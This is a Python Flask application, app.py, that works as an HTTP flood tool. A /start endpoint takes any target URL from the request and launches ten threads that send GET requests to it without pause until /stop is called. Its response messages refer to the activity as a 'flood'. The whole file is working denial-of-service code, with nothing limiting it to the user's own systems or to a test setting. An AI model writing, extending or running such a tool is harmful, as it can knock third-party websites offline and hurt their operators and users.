# app.py
from flask import Flask, request, jsonify
from flask_cors import CORS
import threading
import requests

app = Flask(__name__)
CORS(app) # Allows frontend to communicate with backend

# Global control for the flood
is_flooding = False

def flood_worker(target_url):
    global is_flooding
    while is_flooding:
        try:
            # Sending a GET request to the target URL
            # In a real scenario, you might use POST or specific headers
            response = requests.get(target_url, timeout=5)
            print(f"Sent request to {target_url} - Status: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")

@app.route('/start', methods=['POST'])
def start_flood():
    global is_flooding
    data = request.json
    target_url = data.get('url')
    
    if not target_url:
        return jsonify({"error": "No URL provided"}), 400

    is_flooding = True
    # Starting multiple threads to simulate concurrency
    for _ in range(10): 
        thread = threading.Thread(target=flood_worker, args=(target_url,))
        thread.daemon = True
        thread.start()
    
    return jsonify({"message": "Flood started!"})

@app.route('/stop', methods=['POST'])
def stop_flood():
    global is_flooding
    is_flooding = False
    return jsonify({"message": "Flood stopped!"})

if __name__ == '__main__':
    app.run(debug=True, port=5000)
